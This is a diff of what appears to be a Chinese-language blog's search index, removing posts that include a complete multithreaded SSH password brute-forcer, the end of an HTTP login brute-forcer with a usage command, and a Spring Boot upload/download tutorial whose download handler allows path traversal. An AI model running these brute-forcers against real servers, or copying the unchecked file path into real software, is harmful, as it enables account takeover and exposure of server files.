-        self.username = username
-        self.password = password
-
-
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>
-        data = &#123;
-            <span class="hljs-string">&#x27;username&#x27;</span>:username,
-            <span class="hljs-string">&#x27;password&#x27;</span>:password,
-            <span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;%E7%99%BB%E5%BD%95&#x27;</span>
-        &#125;
-        print(<span class="hljs-string">&quot;username:&#123;&#125;,password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username,password))
-        response = requests.post(self.url, data=data, headers=self.headers)
-
-        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Login failed&#x27;</span> <span class="hljs-keyword">in</span> response.text:
-            <span class="hljs-keyword">pass</span>
-        <span class="hljs-keyword">else</span>:
-            print(<span class="hljs-string">&quot;success!!! username:&#123;&#125;, password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
-            resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)
-            resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
-            resultFile.close()
-            <span class="hljs-comment"># 程序终止，0表示正常退出</span>
-            <span class="hljs-comment"># os._exit(0) </span>
-
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>
-        <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.username:
-            <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.password:
-                self.run(userItem, pwdItem)
-
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">BruteForceHttp</span>():</span>
-
-    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]
-    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwords&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]
-
-    <span class="hljs-comment"># 对密码和用户名进行分块处理</span>
-    blockUsername = partition(listUsername, BLOCK_SIZE)
-    blockPassword = partition(listPassword, BLOCK_SIZE)
-
-    threads = []
-    <span class="hljs-comment"># 将不同的密码子块分给不同的线程爆破</span>
-    <span class="hljs-keyword">for</span> sonUserBlock <span class="hljs-keyword">in</span> blockUsername:
-        <span class="hljs-keyword">for</span> sonPwdBlock <span class="hljs-keyword">in</span> blockPassword:
-
-            work = ThreadWork(sonUserBlock, sonPwdBlock)
-            workThread = threading.Thread(target=work.start)
-
-            threads.append(workThread)
-
-    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
-        t.start()
-    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
-        t.join()
-
-<span class="hljs-comment"># 将密码和账号分块函数</span>
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params">ls, size</span>):</span>
-    res = []
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ls), size):
-        res.append(ls[i: i+size])
-    <span class="hljs-keyword">return</span> res
-
-<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
-    time1 = time.time()
-    BruteForceHttp()
-    time2 = time.time()
-    print(time2-time1)</code></pre>
-
-<p>七十万条的数据跑了快十分钟，有点不可思议。。。可能是服务器的问题</p>
-<h1 id="多线程破解SSH密码"><a href="#多线程破解SSH密码" class="headerlink" title="多线程破解SSH密码"></a>多线程破解SSH密码</h1><blockquote>
-<p>passwords：密码字典 </p>
-<p>username:   账号字典</p>
-<p>result: 保存结果</p>
-<p>SSHattack:连接日志</p>
-<p>brute_SSH.py: 破解程序</p>
-</blockquote>
-<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
-<span class="hljs-keyword">import</span> optparse
-<span class="hljs-keyword">import</span> threading
-<span class="hljs-keyword">import</span> sys
-<span class="hljs-keyword">import</span> os
-<span class="hljs-keyword">import</span> paramiko
-
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>(<span class="hljs-params">threading.Thread</span>):</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, ip, usernameBlock, passwordBlock, port</span>):</span>
-        threading.Thread.__init__(self)
-        self.ip = ip
-        self.port = port
-        self.usernameBlock = usernameBlock
-        self.passwordBlock = passwordBlock
-
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>
-        <span class="hljs-string">&#x27;&#x27;&#x27;</span>
-<span class="hljs-string">        使用死循环</span>
-<span class="hljs-string">        &#x27;&#x27;&#x27;</span>
-        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
-            <span class="hljs-keyword">try</span>:
-                paramiko.util.log_to_file(<span class="hljs-string">&quot;SSHattack.log&quot;</span>)
-                ssh = paramiko.SSHClient()
-
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                sys.stdout.write(<span class="hljs-string">&quot;[*]ssh[&#123;&#125;:&#123;&#125;:&#123;&#125; =&gt; &#123;&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(username,password,self.port, self.ip))
-                ssh.connect(hostname=self.ip, port=self.port, username=username, password=password)
-                ssh.close()
-                print(<span class="hljs-string">&quot;[+]success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username , password))
-
-                resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../brutpass/result&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>)
-
-                resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
-                resultFile.close()
-
-                os._exit(<span class="hljs-number">0</span>)
-            <span class="hljs-keyword">except</span> paramiko.ssh_exception.AuthenticationException <span class="hljs-keyword">as</span> e:
-                <span class="hljs-keyword">break</span>
-            <span class="hljs-keyword">except</span> paramiko.ssh_exception.SSHException <span class="hljs-keyword">as</span> e:
-                <span class="hljs-keyword">break</span>
-
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>
-        <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.usernameBlock:
-            <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.passwordBlock:
-                self.run(userItem, pwdItem)
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params"><span class="hljs-built_in">list</span>, num</span>):</span>
-    step = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>) / num)
-    <span class="hljs-keyword">if</span> step == <span class="hljs-number">0</span>:
-        step = num
-    partition = [<span class="hljs-built_in">list</span>[i:i+step] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>), step)]
-    <span class="hljs-keyword">return</span> partition
-
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SshEXP</span>(<span class="hljs-params">ip, usernameFile, passwordFile, threadNumber, sshPort</span>):</span>
-    print(<span class="hljs-string">&quot;============爆破信息============&quot;</span>)
-    print(<span class="hljs-string">&quot;IP:&quot;</span> + ip)
-    print(<span class="hljs-string">&quot;UserName:&quot;</span> + usernameFile)
-    print(<span class="hljs-string">&quot;PassWord:&quot;</span> + passwordFile)
-    print(<span class="hljs-string">&quot;Threads:&quot;</span> + <span class="hljs-built_in">str</span>(threadNumber))
-    print(<span class="hljs-string">&quot;Port:&quot;</span> + sshPort)
-    print(<span class="hljs-string">&quot;=================================&quot;</span>)
-
-    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/username&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]
-    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/passwords&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]
-
-    <span class="hljs-comment"># 读取账号文件和密码文件并存入对应列表</span>
-    listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(usernameFile)]
-    listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(passwordFile)]
-    <span class="hljs-comment"># 账号列表和密码列表根据线程数量进行分块</span>
-    blockUsername = partition(listUsername, threadNumber)
-    blockPassword = partition(listPassword, threadNumber)
-    threads = []
-    <span class="hljs-comment"># 每个线程分配一个账号密码子块</span>
-    <span class="hljs-keyword">for</span> sonUserBlock <span class="hljs-keyword">in</span> blockUsername:
-        <span class="hljs-keyword">for</span> sonPwdBlock <span class="hljs-keyword">in</span> blockPassword:
-            work = ThreadWork(ip, sonUserBlock, sonPwdBlock, sshPort)
-            <span class="hljs-comment"># 创建线程</span>
-            workThread = threading.Thread(target=work.start)
-            <span class="hljs-comment"># 在threads中加入线程</span>
-            threads.append(workThread)
-    <span class="hljs-comment"># 开始子线程</span>
-    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
-        t.start()
-    <span class="hljs-comment"># 阻塞主线程，等待所有子线程完成工作</span>
-    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
-        t.join()
-<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
-    parser = optparse.OptionParser(<span class="hljs-string">&#x27;usage: python %prog target [options] \n\n&#x27;</span>
-                                   <span class="hljs-string">&#x27;Example: python %prog 127.0.0.1 -u ./username -p ./passwords -t 20\n&#x27;</span>)
-    <span class="hljs-comment"># 添加目标主机参数-i</span>
-    parser.add_option(<span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--ip&#x27;</span>, dest=<span class="hljs-string">&#x27;IP&#x27;</span>,
-                      default=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
-                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target IP&#x27;</span>)
-    <span class="hljs-comment"># 添加线程参数-t</span>
-    parser.add_option(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--threads&#x27;</span>, dest=<span class="hljs-string">&#x27;threadNum&#x27;</span>,
-                      default=<span class="hljs-number">10</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;int&#x27;</span>,
-                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Number of threads [default = 10]&#x27;</span>)
-    <span class="hljs-comment"># 添加用户名文件参数-u</span>
-    parser.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--username&#x27;</span>, dest=<span class="hljs-string">&#x27;userName&#x27;</span>,
-                      default=<span class="hljs-string">&#x27;./username&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
-                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;username file&#x27;</span>)
-    <span class="hljs-comment"># 添加密码文件参数-p</span>
-    parser.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--password&#x27;</span>, dest=<span class="hljs-string">&#x27;passWord&#x27;</span>,
-                      default=<span class="hljs-string">&#x27;./password&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
-                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;password file&#x27;</span>)
-    <span class="hljs-comment"># 添加SSH端口参数-P</span>
-    parser.add_option(<span class="hljs-string">&#x27;-P&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, dest=<span class="hljs-string">&#x27;port&#x27;</span>,
-                      default=<span class="hljs-string">&#x27;22&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;string&#x27;</span>,
-                      <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;ssh port&#x27;</span>)
-    (options, args) = parser.parse_args()
-
-    SshEXP(options.IP, options.userName, options.passWord, options.threadNum, options.port)
-</code></pre>
-
-<p>使用方法</p>
-<pre><code class="hljs stylus">python brute_SSH<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">164.166</span> -u ./username -<span class="hljs-selector-tag">p</span> ./passwords</code></pre>
-
-
-
-<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825163939574.png" alt="image-20210825163939574" style="zoom:80%;">
-
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
   </entry>
   <entry>
     <title>redis</title>
@@ -3544,309 +3780,6 @@ cmdline.execute(<span class="hljs-string">&quot;scrapy crawl 爬虫名字&quot;<
       </categories>
       <tags>
         <tag>spider</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>springboot工具类</title>
-    <url>/2022/04/29/springbooot-upload-file/</url>
-    <content><![CDATA[<h1 id="javaweb中图片文件上传和下载"><a href="#javaweb中图片文件上传和下载" class="headerlink" title="javaweb中图片文件上传和下载"></a>javaweb中图片文件上传和下载</h1><p>使用springboot创建web项目</p>
-<p>服务端要接收客户端页面上传的文件，通常都会使用Apache的两个组件:</p>
-<pre><code class="hljs ebnf"><span class="hljs-attribute">commons-fileupload</span>
-<span class="hljs-attribute">commons-io</span></code></pre>
-
-<p>Spring框架在spring-web包中对文件上传进行了封装，大大简化了服务端代码，实现步骤如下：</p>
-<h2 id="1-创建Controller"><a href="#1-创建Controller" class="headerlink" title="1.创建Controller"></a>1.创建Controller</h2><p>因为图片上传是一个公共接口所以可以创建一个名为<code>CommonController</code>的文件，url地址为<code>/common</code></p>
-<pre><code class="hljs java"><span class="hljs-comment">/**</span>
-<span class="hljs-comment"> * 主要用于文件上传和下载</span>
-<span class="hljs-comment"> */</span>
-
-<span class="hljs-meta">@RestController</span>
-<span class="hljs-meta">@RequestMapping(&quot;/common&quot;)</span>
-<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonController</span> </span>&#123;
-	<span class="hljs-meta">@Value(&quot;$&#123;reggie.path&#125;&quot;)</span> <span class="hljs-comment">// 保存图片的路径</span>
-    <span class="hljs-keyword">private</span> String basePath;
-&#125;</code></pre>
-
-<h3 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h3><pre><code class="hljs java"><span class="hljs-comment">/**</span>
-<span class="hljs-comment"> * 文件上传</span>
-<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> file</span>
-<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
-<span class="hljs-comment"> */</span>
-<span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span>
-<span class="hljs-function"><span class="hljs-keyword">public</span> R&lt;String&gt; <span class="hljs-title">upload</span><span class="hljs-params">(MultipartFile file)</span></span>&#123;
-    <span class="hljs-comment">// file是一个临时文件，后续需要进行转存</span>
-    <span class="hljs-comment">// file需要与前端上传的参数名保持一致，否则无法获取到上传的文件</span>
-    <span class="hljs-comment">// 转存之前需要对文件名进行处理</span>
-    String originalFilename = file.getOriginalFilename();
-    String suffix = originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));
-
-    <span class="hljs-comment">// 防止文件被覆盖，使用uuid作为文件名</span>
-    String filename = UUID.randomUUID().toString();
-    filename = filename + suffix;
-
-    File dir = <span class="hljs-keyword">new</span> File(basePath); <span class="hljs-comment">// 判断文件夹是否存在不存在则创建</span>
-    <span class="hljs-keyword">if</span> (!dir.exists())&#123;
-        dir.mkdir();
-    &#125;
-    <span class="hljs-comment">// 将图片保存的指定位置</span>
-    <span class="hljs-keyword">try</span> &#123;
-        file.transferTo(<span class="hljs-keyword">new</span> File(basePath + filename));
-    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
-        e.printStackTrace();
-    &#125;
-    <span class="hljs-keyword">return</span> R.success(filename);
-&#125;</code></pre>
-
-
-
-<h3 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h3><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span>
-<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">download</span><span class="hljs-params">(String name, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;
-    <span class="hljs-comment">// 文件输入流读取本地文件</span>
-    FileInputStream fileInputStream = <span class="hljs-keyword">null</span>;
-    <span class="hljs-comment">// 使用响应输出流将图片显示在网页上</span>
-    ServletOutputStream outputStream = <span class="hljs-keyword">null</span>;
-
-    <span class="hljs-keyword">try</span> &#123;
-        fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(basePath + name));
-        outputStream = response.getOutputStream();
-        response.setContentType(<span class="hljs-string">&quot;image/jpeg&quot;</span>);
-        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];
-        <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;
-        <span class="hljs-comment">// 读取服务器上的图片后 由响应输出流</span>
-        <span class="hljs-keyword">while</span>( (len = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>)&#123;
-            outputStream.write(bytes, <span class="hljs-number">0</span>, len);
-            outputStream.flush();
-        &#125;
-
-    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
-        e.printStackTrace();
-    &#125; <span class="hljs-keyword">finally</span> &#123;
-        fileInputStream.close();
-        outputStream.close();
-    &#125;
-&#125;</code></pre>
-
-
-
-<h2 id="2-前端页面"><a href="#2-前端页面" class="headerlink" title="2.前端页面"></a>2.前端页面</h2><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
-  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>
-  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span>
-  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>
-  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文件上传<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
-  <span class="hljs-comment">&lt;!-- 引入样式 --&gt;</span>
-  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../plugins/element-ui/index.css&quot;</span> /&gt;</span>
-  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../styles/common.css&quot;</span> /&gt;</span>
-  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../styles/page.css&quot;</span> /&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
-   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;addBrand-container&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;food-add-app&quot;</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>
-        <span class="hljs-tag">&lt;<span class="hljs-name">el-upload</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar-uploader&quot;</span></span>
-<span class="hljs-tag">                <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/common/upload&quot;</span></span>
-<span class="hljs-tag">                <span class="hljs-attr">:show-file-list</span>=<span class="hljs-string">&quot;false&quot;</span></span>
-<span class="hljs-tag">                <span class="hljs-attr">:on-success</span>=<span class="hljs-string">&quot;handleAvatarSuccess&quot;</span></span>
-<span class="hljs-tag">                <span class="hljs-attr">:before-upload</span>=<span class="hljs-string">&quot;beforeUpload&quot;</span></span>
-<span class="hljs-tag">                <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span>
-            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;imageUrl&quot;</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;imageUrl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span>
-            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">v-else</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;el-icon-plus avatar-uploader-icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
-        <span class="hljs-tag">&lt;/<span class="hljs-name">el-upload</span>&gt;</span>
-    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
-  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
-    <span class="hljs-comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/vue/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-    <span class="hljs-comment">&lt;!-- 引入组件库 --&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/element-ui/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-    <span class="hljs-comment">&lt;!-- 引入axios --&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/axios/axios.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../js/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
-<span class="javascript">      <span class="hljs-keyword">new</span> Vue(&#123;</span>
-<span class="javascript">        el: <span class="hljs-string">&#x27;#food-add-app&#x27;</span>,</span>
-<span class="javascript">        <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span>
-<span class="javascript">          <span class="hljs-keyword">return</span> &#123;</span>
-<span class="javascript">            imageUrl: <span class="hljs-string">&#x27;&#x27;</span></span>
-          &#125;
-        &#125;,
-        methods: &#123;
-          handleAvatarSuccess (response, file, fileList) &#123;
-<span class="javascript">              <span class="hljs-built_in">this</span>.imageUrl = <span class="hljs-string">`/common/download?name=<span class="hljs-subst">$&#123;response.data&#125;</span>`</span></span>
-          &#125;,
-          beforeUpload (file) &#123;
-            if(file)&#123;
-<span class="javascript">              <span class="hljs-keyword">const</span> suffix = file.name.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>]</span>
-<span class="javascript">              <span class="hljs-keyword">const</span> size = file.size / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> &lt; <span class="hljs-number">2</span></span>
-<span class="javascript">              <span class="hljs-keyword">if</span>([<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>].indexOf(suffix) &lt; <span class="hljs-number">0</span>)&#123;</span>
-<span class="javascript">                <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&#x27;上传图片只支持 png、jpeg、jpg 格式！&#x27;</span>)</span>
-<span class="javascript">                <span class="hljs-built_in">this</span>.$refs.upload.clearFiles()</span>
-<span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span></span>
-              &#125;
-              if(!size)&#123;
-<span class="javascript">                <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&#x27;上传文件大小不能超过 2MB!&#x27;</span>)</span>
-<span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span></span>
-              &#125;
-<span class="javascript">              <span class="hljs-keyword">return</span> file</span>
-            &#125;
-          &#125;
-        &#125;
-      &#125;)
-    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
-
-<h1 id="mybatis-plus-generator"><a href="#mybatis-plus-generator" class="headerlink" title="mybatis-plus-generator"></a>mybatis-plus-generator</h1><p>MP的代码生成器，可以节约创建文件的时间</p>
-<h2 id="1-导入依赖"><a href="#1-导入依赖" class="headerlink" title="1.导入依赖"></a>1.导入依赖</h2><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--代码生成器--&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
-
-<h2 id="2-编写生成器代码"><a href="#2-编写生成器代码" class="headerlink" title="2.编写生成器代码"></a>2.编写生成器代码</h2><p>可以放在专门的工具类包下</p>
-<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.utils;
-
-<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.FastAutoGenerator;
-<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.OutputFile;
-<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;
-
-<span class="hljs-keyword">import</span> java.util.Collections;
-
-<span class="hljs-comment">/**</span>
-<span class="hljs-comment"> * mp代码生成器</span>
-<span class="hljs-comment"> */</span>
-<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CodeGenreator</span> </span>&#123;
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;
-        generator();
-    &#125;
-
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">generator</span><span class="hljs-params">()</span></span>&#123;
-        FastAutoGenerator.create(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/admin_demo?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&quot;</span>,
-                <span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>)
-                .globalConfig(builder -&gt; &#123;
-                    builder.author(<span class="hljs-string">&quot;sunzy&quot;</span>) <span class="hljs-comment">// 设置作者</span>
-                            .enableSwagger() <span class="hljs-comment">// 开启 swagger 模式</span>
